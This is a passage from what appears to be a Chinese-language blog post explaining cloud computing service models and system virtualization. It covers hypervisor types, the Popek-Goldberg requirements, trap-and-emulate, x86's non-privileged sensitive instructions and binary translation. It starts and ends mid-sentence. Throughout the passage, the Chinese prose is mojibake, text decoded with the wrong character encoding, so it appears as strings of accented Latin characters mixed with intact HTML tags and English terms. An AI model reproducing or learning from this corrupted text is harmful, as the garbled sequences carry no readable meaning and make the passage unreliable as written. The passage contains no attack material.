computingï¼‰å³<strong>é€šè¿‡ç½‘ç»œå‘ç”¨æˆ·æŒ‰éœ€æä¾›å¯åŠ¨æ€ä¼¸ç¼©çš„è®¡ç®—æœåŠ¡ä¸ IT èµ„æº</strong>ï¼Œäº‘æœåŠ¡å‚å•†å°†å¤šä»½å®ä½“èµ„æºä»¥ä¸€å®šå½¢å¼è¿›è¡Œæ•´åˆåï¼Œå°†å…¶ç§°ä¹‹ä¸ºã€Œ<strong>äº‘</strong>ã€ï¼Œé€šè¿‡äº’è”ç½‘æŒ‰éœ€å‘ç”¨æˆ·æä¾›å…¶æ‰€éœ€çš„èµ„æº</li></ul><p>ç›¸ä¿¡å¤§å®¶å·²ç»æ³¨æ„åˆ°å…¶ç›¸ä¼¼ä¹‹å¤„äº†â€”â€”<strong>è™šæ‹ŸåŒ–æŠ€æœ¯ä¾¿æ˜¯äº‘è®¡ç®—æœåŠ¡çš„æŠ€æœ¯åŸºçŸ³ä¹‹ä¸€</strong></p><ul><li>é€šè¿‡è™šæ‹ŸåŒ–å¯ä»¥è§£å†³æ•°æ®ä¸­å¿ƒï¼ˆIDCï¼‰èµ„æºæ•´åˆçš„é—®é¢˜ï¼Œå¯¹è®¡ç®—ã€å­˜å‚¨ç­‰èµ„æºè¿›è¡Œæ ‡å‡†åŒ–</li><li>é€šè¿‡è™šæ‹ŸåŒ–å¯ä»¥å°†èµ„æºè¿›è¡Œæ›´ä¸ºåˆç†çš„åˆ‡å‰²è°ƒåº¦ï¼Œä»è€Œå……åˆ†åˆ©ç”¨ç¡¬ä»¶èµ„æº</li></ul><p><img src="https://s2.loli.net/2022/08/08/5ncJFCOLByoqbPM.png" alt="image.png"></p><blockquote><p>å½“ç„¶äº‘è®¡ç®—çš„åŸºçŸ³ä¸ä»…ä»…æ˜¯è™šæ‹ŸåŒ–ï¼Œä½†æ˜¯è¿™ç¯‡åšå®¢ä¸»è¦è®²çš„è¿˜æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–è€Œä¸æ˜¯äº‘è®¡ç®—ï¼ˆç¬‘ï¼‰</p></blockquote><p>æ ¹æ®æä¾›çš„èµ„æºæœåŠ¡çš„ç±»å‹ä¸åŒï¼Œæˆ‘ä»¬å°†äº‘æœåŠ¡åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p><ul><li><p><strong>Infrastructure-as-a-Service</strong>ï¼ˆIaaSï¼‰ï¼šäº‘å‚å•†å‘ç”¨æˆ·æä¾›<strong>å®Œæ•´çš„åŸºç¡€è®¾æ–½</strong>ï¼Œå³æä¾›<strong>äº‘ç¡¬ä»¶ç¯å¢ƒ</strong>ï¼ŒåŒ…æ‹¬è®¡ç®—ï¼ˆCPUï¼‰ã€å­˜å‚¨ï¼ˆç¡¬ç›˜ï¼‰ã€ç½‘ç»œç­‰ï¼Œç”¨æˆ·éœ€è¦è‡ªè¡Œåœ¨äº‘ç¡¬ä»¶ç¯å¢ƒä¸Šæ­å»ºè‡ªå·±éœ€è¦çš„æœåŠ¡</p><blockquote><p>é€šä¿—ç‚¹è¯´å°±æ˜¯å–æœåŠ¡å™¨ï¼ˆç¬‘ï¼‰</p></blockquote></li><li><p><strong>Platform-as-a-Service</strong>ï¼ˆPaaSï¼‰ï¼šäº‘å‚å•†å‘ç”¨æˆ·æä¾›<strong>è½¯ä»¶éƒ¨ç½²å¹³å°</strong>ï¼Œå³æä¾›æœåŠ¡å™¨å¹³å°æˆ–è€…å¼€å‘ç¯å¢ƒï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨äº‘å¹³å°ä¸Šè¿›è¡Œå¼€å‘éƒ¨ç½²ç­‰å·¥ä½œï¼Œ<strong>è€Œæ— éœ€ç®¡ç†åº•å±‚çš„åŸºç¡€è®¾æ–½</strong></p><blockquote><p>æ¯”å¦‚è¯´å¾®è½¯çš„ Azure å’Œ Redhat çš„ OpenShift</p></blockquote></li><li><p><strong>Software-as-a-Service</strong>ï¼ˆSaaSï¼‰ï¼šäº‘å‚å•†å‘ç”¨æˆ·æä¾›<strong>å…·ä½“çš„è½¯ä»¶æœåŠ¡</strong>ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ç½‘ç»œç›´æ¥ä½¿ç”¨å‚å•†æä¾›çš„æœåŠ¡</p><blockquote><p>æ¯”å¦‚è¯´è…¾è®¯çš„å…±äº«æ–‡æ¡£å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ SaaS</p></blockquote></li></ul><p><img src="https://s2.loli.net/2022/08/07/nF3wLu5cfZQtpPK.png" alt="image.png"></p><p>æˆ‘ä»¬æŒ‰ç…§å…¶éƒ¨ç½²å½¢å¼çš„ä¸åŒè¿˜å¯ä»¥å°†äº‘åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š</p><ul><li><strong>å…¬æœ‰äº‘</strong>ï¼šäº‘æœåŠ¡çš„åŸºç¡€è®¾æ–½éƒ¨ç½²åœ¨äº‘å‚å•†çš„æœºæˆ¿é‡Œï¼Œç”±äº‘å‚å•†å‘ç”¨æˆ·æä¾›äº‘ä¸Šèµ„æºï¼Œ<strong>äº‘èµ„æºå®ä½“ç”±å¤šä¸ªç”¨æˆ·å…±äº«</strong>ï¼ˆä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šå¯èƒ½è·‘å¤šä¸ªç”¨æˆ·çš„è™šæ‹Ÿæœºï¼‰</li><li><strong>ç§æœ‰äº‘</strong>ï¼šäº‘æœåŠ¡çš„åŸºç¡€è®¾æ–½éƒ¨ç½²åœ¨ç”¨æˆ·è‡ªå·±çš„æœºæˆ¿é‡Œï¼ˆéƒ¨ç½²åœ¨å†…éƒ¨è‡ªæœ‰æœºæˆ¿çš„å«å†…éƒ¨ç§æœ‰äº‘ï¼Œéƒ¨ç½²åœ¨å¤–éƒ¨æ‰˜ç®¡æœºæˆ¿çš„å«å¤–éƒ¨ç§æœ‰äº‘ï¼‰ï¼Œç”±äº‘å‚å•†æä¾›éƒ¨ç½²æœåŠ¡æˆ–æ˜¯ç”¨æˆ·è‡ªè¡Œéƒ¨ç½²ï¼Œ<strong>äº‘èµ„æºå®ä½“ç”±ç”¨æˆ·ç‹¬äº«</strong></li><li><strong>æ··åˆäº‘</strong>ï¼šç”¨æˆ·åœ¨ä½¿ç”¨äº‘å‚å•†æä¾›çš„äº‘èµ„æºçš„åŒæ—¶è‡ªå·±ä¹Ÿæ­å»ºäº†ä¸€ä¸ªäº‘</li></ul><p><img src="https://s2.loli.net/2022/08/07/SrJDGa6shAWq4ul.png" alt="image.png"></p><blockquote><p>ç°åœ¨ç½‘ä¸Šå„ç§å…³äºäº‘è®¡ç®—çš„æ–‡ç« åŒ…æ‹¬åƒç™¾åº¦ç™¾ç§‘è¿™æ ·çš„ï¼Œ<strong>å‡ ä¹æ²¡æœ‰ä¸€ä¸ªèƒ½å‡†ç¡®ç»™è¿™ä¸ªæ¦‚å¿µä¸‹ä¸€ä¸ªæœ€åŸºæœ¬çš„å®šä¹‰çš„</strong>ï¼Œå…¨ç¯‡éƒ½æ˜¯å„ç§å‡å¤§ç©ºçš„å¥—è¯ï¼Œçœ‹ç€è®©äººè¡€å‹å‡é«˜â€¦â€¦</p><blockquote><p><del>ğŸ‘´è§‰å¾—ç™¾åº¦ç™¾ç§‘å°±æ˜¯ä¸ªğŸ“â‘§</del></p></blockquote><p>äº‘è®¡ç®—æœ¬è´¨ä¸Šå…¶å®å°±æ˜¯ä¸€ä¸ªé€šè¿‡äº’è”ç½‘å‘ç”¨æˆ·æŒ‰éœ€æä¾›å¯åŠ¨æ€ä¼¸ç¼©çš„ IT èµ„æºï¼Œ<strong>è‡³äºç”¨æˆ·æ‹¿åˆ°è¿™ä¸ªè®¡ç®—èµ„æºåè¦åšä»€ä¹ˆç¬”è€…å¹¶ä¸å…³å¿ƒ</strong>ï¼ˆç¬‘ï¼‰</p></blockquote><h1 id="0x02-ç³»ç»Ÿè™šæ‹ŸåŒ–æ¦‚è¿°"><a href="#0x02-ç³»ç»Ÿè™šæ‹ŸåŒ–æ¦‚è¿°" class="headerlink" title="0x02. ç³»ç»Ÿè™šæ‹ŸåŒ–æ¦‚è¿°"></a>0x02. ç³»ç»Ÿè™šæ‹ŸåŒ–æ¦‚è¿°</h1><h2 id="ä¸€ã€åŸºæœ¬æ¨¡å‹"><a href="#ä¸€ã€åŸºæœ¬æ¨¡å‹" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¨¡å‹"></a>ä¸€ã€åŸºæœ¬æ¨¡å‹</h2><p>å¯¹äºä¸€å°è®¡ç®—æœºï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°æŠ½è±¡æˆä¸‹å›¾æ‰€ç¤ºçš„ä¸‰å±‚æ¨¡å‹ï¼Œä»ä¸‹å¾€ä¸Šåˆ†åˆ«æ˜¯<strong>ç‰©ç†ç¡¬ä»¶å±‚ã€æ“ä½œç³»ç»Ÿå±‚ã€åº”ç”¨ç¨‹åºå±‚</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/08/02/5jwhR2HnDTCp3q8.png" alt="image.png"></p><p>æˆ‘ä»¬é¦–å…ˆç»™ã€Œè™šæ‹Ÿæœºã€ä¸‹ä¸€ä¸ªå®šä¹‰ï¼š</p><ul><li><strong>è™šæ‹Ÿæœº</strong>ï¼ˆVirtual Machineï¼‰æ˜¯è®¡ç®—æœºçš„è™šæ‹ŸåŒ–å®ä¾‹ï¼Œæ‹¥æœ‰è‡ªå·±çš„è™šæ‹Ÿç¡¬ä»¶ï¼ˆå¦‚ CPUã€å†…å­˜ã€è®¾å¤‡ç­‰ï¼‰ï¼Œå¯æ‰§è¡Œä¸è®¡ç®—æœºå‡ ä¹å®Œå…¨ç›¸åŒçš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬è¿è¡Œåº”ç”¨å’Œæ“ä½œç³»ç»Ÿ</li></ul><p>å³æˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹çœ‹ä½œæ˜¯ä¸€å°å…·æœ‰å¦‚ä¸Šå›¾æ‰€ç¤ºå±‚æ¬¡çš„<strong>é€»è¾‘çš„è®¡ç®—æœº</strong></p><p>ä½†è™šæ‹Ÿæœºçš„è¿è¡Œæ˜¯éœ€è¦æœ‰ç‰©ç†ç¯å¢ƒæ‰€æ”¯æ’‘çš„ï¼ŒåŒæ—¶è™šæ‹Ÿæœºå®ä¾‹ä¹Ÿæ˜¯ä¸å¯èƒ½å‡­ç©ºå‡ºç°&#x2F;å‡­ç©ºæ¶ˆå¤±çš„ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µâ€”â€”<strong>VMM</strong>ï¼Œå³ <code>Virtual Machine Monitor</code>ï¼Œåˆç§° <code>Hypervisor</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªä»‹äº VM ä¸ç¡¬ä»¶ä¸­é—´çš„è½¯ä»¶å±‚ï¼Œ<strong>å…¶è´Ÿè´£ VM çš„åˆ›å»ºã€é”€æ¯ç­‰å·¥ä½œï¼Œå¹¶ä¸º VM æä¾›äº†è¿è¡Œç¯å¢ƒ</strong>ï¼šã€Œè™šæ‹Ÿç¡¬ä»¶æŠ½è±¡å±‚ã€</p><p><img src="https://s2.loli.net/2022/08/05/C4czg3kVIKAJb5L.png" alt="image.png"></p><p>1974å¹´ï¼ŒGerald J. Popek ä¸ Robert P. Goldberg å‘è¡¨äº†åˆä½œè®ºæ–‡<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">ã€ŠFormal Requirements for Virtualizable Third Generation Architecturesã€‹</a>ï¼Œåœ¨è®ºæ–‡ä¸­æå‡ºäº†æ»¡è¶³è™šæ‹ŸåŒ–ç³»ç»Ÿç»“æ„çš„ VMM çš„ä¸‰ä¸ªå……åˆ†æ¡ä»¶ï¼Œç§°ä¹‹ä¸º<code>Popek and Goldberg virtualization requirements</code>ï¼š</p><ul><li><strong>ç­‰ä»·æ€§</strong>ï¼ˆessentially identicalï¼‰ï¼šä¸€ä¸ªè¿è¡Œäº VMM ä¸‹çš„ç¨‹åºï¼Œ<strong>å…¶è¡Œä¸ºåº”ä¸ç›´æ¥è¿è¡Œäºç­‰ä»·ç‰©ç†æœºä¸Šçš„åŒç¨‹åºçš„è¡Œä¸ºå®Œå…¨ä¸€è‡´</strong></li><li><strong>èµ„æºæ§åˆ¶</strong>ï¼ˆresource controlï¼‰ï¼šVMM å¯¹è™šæ‹Ÿèµ„æºå…·æœ‰<strong>å®Œå…¨çš„æ§åˆ¶èƒ½åŠ›</strong>ï¼ŒåŒ…æ‹¬èµ„æºçš„åˆ†é…ã€ç›‘æ§ã€å›æ”¶</li><li><strong>æ•ˆç‡æ€§</strong>ï¼ˆefficiencyï¼‰ï¼šæœºå™¨æŒ‡ä»¤ä¸­ç»å¸¸ä½¿ç”¨çš„é‚£ä¸€éƒ¨åˆ†åº”åœ¨æ²¡æœ‰ VMM å¹²é¢„ä¸‹<strong>ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œ</strong></li></ul><p>ç”±æ­¤ï¼Œè®ºæ–‡ä¸­æå‡ºäº†ä¸¤ç§ Hypervisor æ–¹æ¡ˆï¼Œè¿™ä¹Ÿæˆä¸ºäº†ç°åœ¨æœ€ä¸»æµçš„ä¸¤ç§æ–¹æ¡ˆï¼š</p><ul><li><p><code>Type I</code> ï¼š<strong>Hypervisor ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Šï¼Œå³ä»¥ Hypervisor ä½œä¸º Host OS ç›´æ¥ç®¡æ§ç¡¬ä»¶èµ„æº</strong>ã€‚ä¾‹å¦‚ <code>VMware ESXI</code> ä¾¿æ˜¯é‡‡ç”¨æ­¤ç§æ¶æ„çš„ Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/Mn2cKxtpXdibHRG.png" alt="image.png"></p></li><li><p><code>Type II</code>ï¼š<strong>Hypervisor è¿è¡Œåœ¨ä¼ ç»Ÿçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œä¸å…¶ä»–åº”ç”¨ç¨‹åºå¹¶è¡Œè¿è¡Œ</strong>ã€‚ä¾‹å¦‚ <code>Qemu</code> ä¸ <code>VMware Player</code> ä¾¿æ˜¯é‡‡ç”¨æ­¤ç§æ¶æ„çš„ Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/FNComsjbSdTheL6.png" alt="image.png"></p></li></ul><p>å…·ä½“åˆ°æŠ€æœ¯ç»†èŠ‚ä¸Šï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•å»å®ç°ä¸Šè¿°çš„è™šæ‹ŸåŒ–æ–¹æ¡ˆå‘¢ï¼Ÿæˆ‘ä»¬å…ˆæ¥ä»‹ç»ä¸€ä¸ªæ¦‚å¿µâ€”â€”ã€Œæ•æ„ŸæŒ‡ä»¤ã€ï¼Œå³<strong>æ“ä½œç‰¹æƒèµ„æºçš„æŒ‡ä»¤</strong>ï¼Œä¾‹å¦‚ IO æ“ä½œã€ä¿®æ”¹é¡µè¡¨å¯„å­˜å™¨ç­‰</p><p>ä¸ºäº†æˆ‘ä»¬çš„ VMM èƒ½å¤Ÿå®Œå…¨åœ°æ§åˆ¶ç³»ç»Ÿèµ„æºï¼Œ<strong>æ•æ„Ÿè´¨é‡å¿…é¡»åœ¨ VMM çš„ç›‘æ§å®¡æŸ¥ä¸‹å®Œæˆï¼Œæˆ–æ˜¯ç»ç”± VMM æ¥å®Œæˆ</strong>ã€‚å› æ­¤ï¼Œè‹¥ä¸€ä¸ªæ¶æ„ä¸­æ‰€æœ‰çš„ç‰¹æƒæŒ‡ä»¤éƒ½æ˜¯æ•æ„Ÿè´¨é‡ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>ç‰¹æƒçº§å‹ç¼©</strong>ï¼ˆRing Compressionï¼‰çš„æ–¹å¼æ¥å®ç°è™šæ‹Ÿç¯å¢ƒï¼š</p><ul><li>VMM è¿è¡Œåœ¨æœ€é«˜ç‰¹æƒçº§ä¸Šï¼ŒGuest VM è¿è¡Œåœ¨ä½ç‰¹æƒçº§ä¸Šï¼Œå½“ Guest VM æ‰§è¡Œåˆ°æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œå…¶ä¾¿ä¼šé™·å…¥ä½äºæœ€é«˜ç‰¹æƒçº§çš„ VMMï¼Œæ­¤æ—¶ä¾¿èƒ½ç”± VMM æ¨¡æ‹Ÿæ•æ„ŸæŒ‡ä»¤çš„è¡Œä¸º</li></ul><p>â€”â€”è¿™å°±æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–æœ€å…¸ä¸­å…¸çš„æ¨¡å‹<strong>ã€ŒTrap &amp; Emulateã€</strong>ï¼š</p><ul><li>æˆ‘ä»¬å°†æ“ä½œç³»ç»Ÿåˆ†ä¸ºä¸¤ä¸ªè¿è¡Œæ¨¡å¼ï¼šã€Œç”¨æˆ·æ¨¡å¼ï¼ˆuser modeï¼‰ã€ä¸ã€Œç‰¹æƒæ¨¡å¼ï¼ˆprivileged modeï¼‰ã€ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹åªèƒ½ç›´æ¥æ‰§è¡Œéç‰¹æƒæŒ‡ä»¤ï¼Œå½“æ‰§è¡Œåˆ°ç‰¹æƒæŒ‡ä»¤æ—¶ä¾¿ä¼šè§¦å‘å¼‚å¸¸ï¼Œä»è€Œé™·å…¥ç‰¹æƒæ¨¡å¼å¯¹åº”çš„å¤„ç†ä»£ç ä¸­</li><li>Guest VM è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œä»è€Œä½¿å¾—æ™®é€šæŒ‡ä»¤å¯ä»¥ç›´æ¥æ”¾åœ¨ CPU ä¸Šæ‰§è¡Œï¼Œå½“ Guest VM æ‰§è¡Œåˆ°<strong>æ•æ„ŸæŒ‡ä»¤</strong>æ—¶ï¼Œä¾¿ä¼š<strong>è§¦å‘å¼‚å¸¸ï¼Œæ­¤æ—¶ç”± VMM ä»‹å…¥å¹¶æ¨¡æ‹Ÿå…¶åº”æœ‰çš„è¡Œä¸º</strong></li></ul><p>å› æ­¤ï¼Œä¸€ä¸ª ISA æ˜¯å¦å¯ä»¥è™šæ‹ŸåŒ–ï¼Œå…¶æ ¸å¿ƒå°±åœ¨äº<strong>æ•æ„ŸæŒ‡ä»¤æ˜¯å¦éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤</strong></p><p><img src="https://s2.loli.net/2022/08/04/cipfjY89LsgIlVb.png" alt="çŸ¥ä¹å·çš„å›¾"></p><p>è€Œç”±äºç¡¬ä»¶å®ä½“èµ„æºä¹Ÿæœ‰ç€ä¸åŒçš„ç±»å‹ï¼Œæˆ‘ä»¬å°†å¯¹ä¸åŒç±»å‹å®ä½“èµ„æºçš„è™šæ‹ŸåŒ–æŠ€æœ¯åˆ†ä¸ºå¦‚ä¸‹ç±»å‹ï¼š</p><ul><li>CPU è™šæ‹ŸåŒ–</li><li>å†…å­˜è™šæ‹ŸåŒ–</li><li>I&#x2F;O è™šæ‹ŸåŒ–</li></ul><h2 id="äºŒã€é‡åˆ°çš„é—®é¢˜"><a href="#äºŒã€é‡åˆ°çš„é—®é¢˜" class="headerlink" title="äºŒã€é‡åˆ°çš„é—®é¢˜"></a>äºŒã€é‡åˆ°çš„é—®é¢˜</h2><p>åœ¨è™šæ‹ŸåŒ–æŠ€æœ¯çš„å‘å±•åˆæœŸï¼Œåœ¨ä¸ªäººè®¡ç®—æœºé¢†åŸŸå¹¿æ³›ä½¿ç”¨çš„ x86 æ¶æ„å¹¶æ²¡æœ‰å¯¹è™šæ‹ŸåŒ–çš„ç»å…¸æ¶æ„ã€ŒTrap &amp; Emulateã€æä¾›å¾ˆå¥½çš„æ”¯æŒï¼Œå­˜åœ¨ç€å¯¹ç³»ç»Ÿè™šæ‹ŸåŒ–çš„æ”¯æŒç¼ºé™·ï¼Œ<strong>ç³»ç»Ÿè™šæ‹ŸåŒ–å¹¶ä¸èƒ½ç›´æ¥è€Œæœ‰æ•ˆçš„å®ç°</strong></p><p>Intel åˆ†çº§ä¿æŠ¤ç¯å°†æƒé™åˆ†ä¸º ring0~ ring3ï¼Œå…¶ä¸­æ“ä½œç³»ç»Ÿå†…æ ¸è¿è¡Œåœ¨ ring0 æƒé™è€Œç”¨æˆ·è¿›ç¨‹è¿è¡Œåœ¨ ring3 æƒé™</p><p><img src="https://i.loli.net/2021/02/22/yQXZhLEHVn1b3uC.png"></p><p>åœ¨ç³»ç»Ÿè™šæ‹ŸåŒ–çš„ç»å…¸æ¶æ„ã€ŒTrap &amp; Emulateã€ä¸­ï¼Œ Guest OS å…¨éƒ¨è¿è¡Œåœ¨ ring3ï¼Œå½“æ¶‰åŠåˆ°ä¸€äº›æ•æ„ŸæŒ‡ä»¤æ—¶ï¼ŒVM è§¦å‘ General Protection å¼‚å¸¸ï¼Œç”± VMM è¿›è¡Œæˆªè·å¹¶å¤„ç†ï¼Œ<strong>ä½†ä¸æ˜¯æ‰€æœ‰æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼Œä¸æ˜¯æ‰€æœ‰çš„æ•æ„ŸæŒ‡ä»¤éƒ½æœ‰è§¦å‘å¼‚å¸¸ä»¥è®© VMM ä»‹å…¥çš„æœºä¼š</strong>ï¼Œ x86 æ¶æ„ä¸­<strong>ä¸€å…±æœ‰ 17 æ¡éç‰¹æƒæ•æ„ŸæŒ‡ä»¤</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/08/04/qirIbepFOA4U5xf.png" alt="image.png"></p><p>è¿™äº›æŒ‡ä»¤<strong>ç›´æ¥è¿åäº† <code>Popek and Goldberg virtualization requirements</code> ï¼Œä»è€Œä½¿å¾— x86 ä¸æ˜¯ä¸€ä¸ªå¯ä»¥è™šæ‹ŸåŒ–çš„æ¶æ„</strong></p><blockquote><p>ä¾‹å¦‚åœ¨ x86 ä¸‹æˆ‘ä»¬æƒ³è¦ç”¨ popf ä¿®æ”¹ eflags çš„ä¸­æ–­å¼€å…³ä½ï¼ˆIFï¼‰æ—¶ï¼Œè‹¥æˆ‘ä»¬åœ¨ç”¨æˆ·æ€ä¸‹è¿›è¡Œè¿™æ ·çš„æ“ä½œï¼Œ<strong>åˆ™ä¼šç›´æ¥è¢«ç¡¬ä»¶æ‰€å¿½è§†ï¼Œè€Œä¸ä¼šå¼•èµ·å¼‚å¸¸</strong>ï¼Œè¿™ä»¤ VMM æ— æ³•ä»‹å…¥</p></blockquote><p>â€œç¡¬ä»¶ä¸å¤Ÿï¼Œè½¯ä»¶æ¥å‡‘â€ã€‚å› æ­¤åœ¨ç¡¬ä»¶è¿˜æœªæä¾›å¯¹è™šæ‹ŸåŒ–çš„è¶³å¤Ÿæ”¯æŒä¹‹å‰ï¼ŒHypervisor åªèƒ½ä»è½¯ä»¶å±‚é¢ä¸‹åŠŸå¤«ï¼Œäºæ˜¯å‡ºç°äº†ä¸¤ç§çº¯è½¯ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯ï¼šã€Œæ¨¡æ‹Ÿæ‰§è¡Œã€ï¼ˆVMWareï¼‰ä¸ã€Œç›´æ¥æºä»£ç æ”¹å†™ã€ï¼ˆXenï¼‰</p><p>åœ¨è½¯ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯å·²ç»å‘å±•æˆç†Ÿå¤šå¹´ä¹‹åï¼Œx86 æ¶æ„å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒæ‰å§—å§—æ¥è¿Ÿï¼šã€Œç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ã€ï¼ˆIntel VTï¼‰å¼€å§‹å‡ºç°åœ¨äººä»¬çš„è§†é‡å½“ä¸­</p><h2 id="ä¸‰ã€å®ç°æ–¹æ¡ˆ"><a href="#ä¸‰ã€å®ç°æ–¹æ¡ˆ" class="headerlink" title="ä¸‰ã€å®ç°æ–¹æ¡ˆ"></a>ä¸‰ã€å®ç°æ–¹æ¡ˆ</h2><h3 id="I-å®Œå…¨è™šæ‹ŸåŒ–ï¼ˆFull-virtualizationï¼‰"><a href="#I-å®Œå…¨è™šæ‹ŸåŒ–ï¼ˆFull-virtualizationï¼‰" class="headerlink" title="I.å®Œå…¨è™šæ‹ŸåŒ–ï¼ˆFull-virtualizationï¼‰"></a>I.å®Œå…¨è™šæ‹ŸåŒ–ï¼ˆFull-virtualizationï¼‰</h3><p>å®Œå…¨è™šæ‹ŸåŒ–æŠ€æœ¯æä¾›ä¸€ä¸ª<strong>å®Œæ•´çš„è™šæ‹ŸåŒ–ç¡¬ä»¶ç¯å¢ƒ</strong>ï¼Œå…è®¸<strong>æœªç»ä¿®æ”¹çš„ Guest OS ç›´æ¥åœ¨ VM ä¸Šè¿è¡Œ</strong>ï¼Œåœ¨ Guest OS çš„è§†è§’ï¼Œå…¶ä¸è¿è¡Œåœ¨çœŸå®çš„ç‰©ç†å¹³å°ä¸Šä¸€èˆ¬æ— äºŒ</p><p>å®Œå…¨è™šæ‹ŸåŒ–æ„å‘³ç€ Guest OS ä¼šå°†æ“ä½œæ­£å¸¸çš„å¤„ç†å™¨ã€å†…å­˜ã€I&#x2F;O è®¾å¤‡é‚£æ ·åœ¨è™šæ‹ŸåŒ–ç¡¬ä»¶ç¯å¢ƒä¸­æ“ä½œï¼Œå› æ­¤è¿™éœ€è¦ VMM èƒ½å¤Ÿæ­£ç¡®å¤„ç† Guest OS æ‰€æœ‰å¯èƒ½çš„è¡Œä¸ºï¼Œå› æ­¤è¿™éœ€è¦å¯¹åº”çš„æ¶æ„æ»¡è¶³ <code>Popek and Goldberg virtualization requirements</code></p><p>ç”±äº x86 æ¶æ„çš„ç¡¬ä»¶åœ¨æœ€åˆå¹¶æ²¡æœ‰å¯¹è™šæ‹ŸåŒ–æä¾›å¾ˆå¥½çš„æ”¯æŒï¼Œå› æ­¤å®Œå…¨è™šæ‹ŸåŒ–ç»å†äº†ä¸¤ä¸ªé˜¶æ®µï¼š</p><h4 id="1ï¼‰ã€Œè½¯ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€"><a href="#1ï¼‰ã€Œè½¯ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€" class="headerlink" title="1ï¼‰ã€Œè½¯ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€"></a>1ï¼‰ã€Œè½¯ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€</h4><p>çº¯è½¯ä»¶å®ç°çš„å®Œå…¨è™šæ‹ŸåŒ–ä¸»è¦ä¾èµ–ä¸¤ä¸ªæŠ€æœ¯ï¼š</p><ul><li><strong>ã€Œä¼˜å…ˆçº§å‹ç¼©ã€</strong>ï¼ˆRing Compressionï¼‰ï¼š<strong>å³ VMM ä¸ GUest VM è¿è¡Œåœ¨ä¸åŒçš„ç‰¹æƒçº§ä¸Š</strong>ã€‚ä¾‹å¦‚ <code>VMM è¿è¡Œåœ¨ ring0ã€Guest OS kernel è¿è¡Œåœ¨ ring1ã€Guest APP è¿è¡Œåœ¨ ring3 </code>ï¼Œå½“ Guest OS æƒ³è¦å°è¯•æ‰§è¡Œç‰¹æƒæŒ‡ä»¤æ—¶ï¼Œä¾¿ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ­¤æ—¶ VMM ä¾¿èƒ½æˆªè·è¯¥ç‰¹æƒæŒ‡ä»¤å¹¶è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œã€‚ä½†æ­£å¦‚æˆ‘ä»¬å‰é¢æ‰€è¯´ï¼Œ<strong>ä¸æ˜¯æ‰€æœ‰æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤</strong>ï¼Œè¿™ä½¿å¾—éƒ¨åˆ†æ•æ„ŸæŒ‡ä»¤æ— æ³•è¢« VMM æˆªè·å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´äº†è™šæ‹ŸåŒ–å¹³å°ä¸ç‰©ç†å¹³å°è¡¨ç°çš„è¡Œä¸ºä¸ä¸€è‡´</li><li><strong>ã€ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘ã€</strong>ï¼ˆBinary Translationï¼‰ï¼šäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘è¢«å¼•å…¥æ¥<strong>å¤„ç†å¯¹è™šæ‹ŸåŒ–ä¸å‹å¥½çš„æŒ‡ä»¤</strong>ï¼Œå…¶æ€æƒ³ä¾¿æ˜¯æ‰«æå¹¶ä¿®æ”¹ Guest VM çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå°†éš¾ä»¥è™šæ‹ŸåŒ–çš„æŒ‡ä»¤è½¬åŒ–ä¸ºæ”¯æŒè™šæ‹ŸåŒ–çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚æ˜¾å¼åœ°è§¦å‘å¼‚å¸¸è®© VMM å¾—ä»¥ä»‹å…¥ï¼‰ï¼Œå¯¹äºéæ•æ„ŸæŒ‡ä»¤åˆ™ä»æ˜¯ç›´æ¥æ‰§è¡Œã€‚è¿™åœ¨ç¡®ä¿äº†æ€§èƒ½çš„æƒ…å†µä¸‹å®ç°äº†å®Œå…¨è™šæ‹ŸåŒ–</li></ul><p><img src="https://s2.loli.net/2022/08/05/AqLhpontmYHCS8T.png" alt="image.png"></p><blockquote><p> VMware ä¸ Qemu 